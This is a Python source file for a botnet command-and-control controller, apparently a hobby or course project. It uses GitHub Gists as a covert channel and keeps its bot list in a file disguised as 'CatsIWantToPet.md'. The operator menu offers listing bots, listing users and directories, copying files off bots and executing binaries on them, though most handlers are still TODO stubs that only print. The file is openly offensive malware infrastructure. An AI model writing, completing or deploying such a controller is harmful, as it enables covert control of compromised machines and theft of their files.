import sys
import time
from Controller import gist
from Controller.Commands import alive
from threading import Thread
from timeit import default_timer as timer

from Controller.Commands.ls_bots import list_current_bots


def reader():
    while True:
        read = sys.stdin.readline()
        cmd = read.split()
        match cmd[0]:
            case "ls_bots":
                print("LS_BOTS added to execute list")
                EXECUTE_CMDS.append(["ls_bots"])
            case "w":
                if len(cmd) <= 1:
                    print("Not enough parameters", file=sys.stderr)
                    continue
                print("W added to execute list")
                EXECUTE_CMDS.append(["w", cmd[1]])
            case "ls":
                if len(cmd) <= 2:
                    print("Not enough parameters", file=sys.stderr)
                    continue
                print("LS added to execute list")
                EXECUTE_CMDS.append(["ls", cmd[1], cmd[2]])
            case "id":
                if len(cmd) <= 1:
                    print("Not enough parameters", file=sys.stderr)
                    continue
                print("ID added to execute list")
                EXECUTE_CMDS.append(["id", cmd[1]])
            case "cp":
                if len(cmd) <= 2:
                    print("Not enough parameters", file=sys.stderr)
                    continue
                print("CP added to execute list")
                EXECUTE_CMDS.append(["cp", cmd[1], cmd[2]])
            case "exec":
                if len(cmd) <= 2:
                    print("Not enough parameters", file=sys.stderr)
                    continue
                print("EXEC added to execute list")
                EXECUTE_CMDS.append(["exec", cmd[1], cmd[2]])
            case _:
                print("usage: <command name> [bot name] [parameter1 ...]\n\n"
                      "\tls_bots.py \t\t\t\t(lists all currently available bots)\n"
                      "\tw  <bot id> \t\t\t(lists users currently logged in)\n"
                      "\tls <bot id> <PATH> \t(list content of specified directory)\n"
                      "\tid <bot id> \t\t\t(id of current user)\n"
                      "\tcp <bot id> <PATH> \t(copy fole from the bot to controller)\n"
                      "\texec <bot id> <PATH> \t(execute a binary inside the bot given the name of the binary)\n")


def executor():
    start = timer()
    while True:
        if len(EXECUTE_CMDS) > 0:
            cmd = EXECUTE_CMDS.pop(0)
            match cmd[0]:
                case "ls_bots":
                    list_current_bots(GIST_API, BOT_LIST)
                case "w":
                    print("TODO: w on bot {}".format(cmd[1]))
                case "ls":
                    print("TODO: ls on bot {}, path {}".format(cmd[1], cmd[2]))
                case "id":
                    print("TODO: id on bot {}".format(cmd[1]))
                case "cp":
                    print("TODO: cp on bot {}, path {}".format(cmd[1], cmd[2]))
                case "exec":
                    print("TODO: exec on bot {}, path {}".format(cmd[1], cmd[2]))
                case _:
                    print("Unknown command" + cmd[0])

        # Check if the bots are alive every 5 minutes
        if timer() - start > 10:    # TODO 5 min = 300 s
            # Reset bots
            print("Starting bot reset ...")
            alive.reset_bots(GIST_API, BOT_LIST)
            time.sleep(2)
            # Check if bots are alive -> remove dead
            print("Removing dead bots...")
            alive.check_bots(GIST_API, BOT_LIST)
            start = timer()


# Prepare helper folders
gist.init_folders()

# Define parameters
EXECUTE_CMDS = []
BOT_LIST = "CatsIWantToPet.md"
GIST_API = gist.get_gist_api()

# Create init bot list on gist
gist.init_bot_list(GIST_API, BOT_LIST)

# Run threads for reading and executing
reader_thread = Thread(target=reader)
executor_thread = Thread(target=executor)
reader_thread.start()
executor_thread.start()

# Cleanup all helper folders
# gist.clean_up_folders()
